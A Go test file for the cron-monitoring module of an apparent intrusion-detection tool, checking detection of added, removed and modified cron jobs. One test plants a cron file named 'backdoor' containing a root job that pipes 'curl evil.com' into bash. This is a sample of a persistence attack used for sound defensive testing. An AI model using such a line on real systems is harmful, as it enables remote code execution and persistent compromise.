package cron

import (
	"context"
	"os"
	"path/filepath"
	"testing"

	"github.com/jclement/tripline/internal/engine"
)

func testModuleConfig(t *testing.T) engine.ModuleConfig {
	t.Helper()
	dir := t.TempDir()
	return engine.ModuleConfig{
		StateDir:     dir,
		BaselinesDir: filepath.Join(dir, "baselines"),
		Settings:     make(map[string]interface{}),
	}
}

func TestName(t *testing.T) {
	if New().Name() != "cron" {
		t.Error("wrong name")
	}
}

func TestLearningMode(t *testing.T) {
	cfg := testModuleConfig(t)
	dir := t.TempDir()
	crontab := filepath.Join(dir, "crontab")
	os.WriteFile(crontab, []byte("*/5 * * * * root /usr/bin/backup\n"), 0644)

	m := New()
	m.CrontabPath = crontab
	m.CronDirs = nil
	m.Init(cfg)

	findings, err := m.Scan(context.Background())
	if err != nil {
		t.Fatal(err)
	}
	if len(findings) != 0 {
		t.Errorf("expected 0 findings in learning mode, got %d", len(findings))
	}
}

func TestDetectsNewCron(t *testing.T) {
	cfg := testModuleConfig(t)
	dir := t.TempDir()
	cronDir := filepath.Join(dir, "cron.d")
	os.MkdirAll(cronDir, 0755)

	m := New()
	m.CrontabPath = filepath.Join(dir, "crontab")
	os.WriteFile(m.CrontabPath, []byte(""), 0644)
	m.CronDirs = []string{cronDir}
	m.Init(cfg)
	m.Scan(context.Background()) // baseline (empty)

	// Add a cron job
	os.WriteFile(filepath.Join(cronDir, "backdoor"), []byte("* * * * * root curl evil.com | bash\n"), 0644)

	findings, _ := m.Scan(context.Background())
	if len(findings) == 0 {
		t.Error("expected cron-added finding")
	}
	found := false
	for _, f := range findings {
		if f.FindingID == "cron-added:"+filepath.Join(cronDir, "backdoor") {
			found = true
		}
	}
	if !found {
		t.Errorf("expected finding for new cron file, got: %v", findings)
	}
}

func TestDetectsRemovedCron(t *testing.T) {
	cfg := testModuleConfig(t)
	dir := t.TempDir()
	cronDir := filepath.Join(dir, "cron.d")
	os.MkdirAll(cronDir, 0755)
	cronFile := filepath.Join(cronDir, "backup")
	os.WriteFile(cronFile, []byte("0 2 * * * root /usr/bin/backup\n"), 0644)

	m := New()
	m.CrontabPath = filepath.Join(dir, "empty")
	os.WriteFile(m.CrontabPath, []byte(""), 0644)
	m.CronDirs = []string{cronDir}
	m.Init(cfg)
	m.Scan(context.Background()) // baseline

	os.Remove(cronFile)

	findings, _ := m.Scan(context.Background())
	found := false
	for _, f := range findings {
		if f.FindingID == "cron-removed:"+cronFile {
			found = true
		}
	}
	if !found {
		t.Error("expected cron-removed finding")
	}
}

func TestDetectsModifiedCron(t *testing.T) {
	cfg := testModuleConfig(t)
	dir := t.TempDir()
	crontab := filepath.Join(dir, "crontab")
	os.WriteFile(crontab, []byte("0 2 * * * root /usr/bin/backup\n"), 0644)

	m := New()
	m.CrontabPath = crontab
	m.CronDirs = nil
	m.Init(cfg)
	m.Scan(context.Background()) // baseline

	// Modify the cron
	os.WriteFile(crontab, []byte("0 2 * * * root /usr/bin/evil\n"), 0644)

	findings, _ := m.Scan(context.Background())
	if len(findings) < 1 {
		t.Error("expected findings for modified cron")
	}
}

func TestSkipsComments(t *testing.T) {
	dir := t.TempDir()
	path := filepath.Join(dir, "crontab")
	os.WriteFile(path, []byte("# comment\n\nSHELL=/bin/bash\n0 * * * * root test\n"), 0644)

	entries := scanCronFile(path)
	if len(entries) != 1 {
		t.Errorf("expected 1 entry (skipping comments/vars), got %d", len(entries))
	}
}

func TestRebaseline(t *testing.T) {
	cfg := testModuleConfig(t)
	dir := t.TempDir()
	crontab := filepath.Join(dir, "crontab")
	os.WriteFile(crontab, []byte("0 * * * * root test\n"), 0644)

	m := New()
	m.CrontabPath = crontab
	m.CronDirs = nil
	m.Init(cfg)
	m.Scan(context.Background())

	os.WriteFile(crontab, []byte("0 * * * * root newcommand\n"), 0644)
	m.Rebaseline(context.Background())

	findings, _ := m.Scan(context.Background())
	if len(findings) != 0 {
		t.Errorf("expected 0 findings after rebaseline, got %d", len(findings))
	}
}
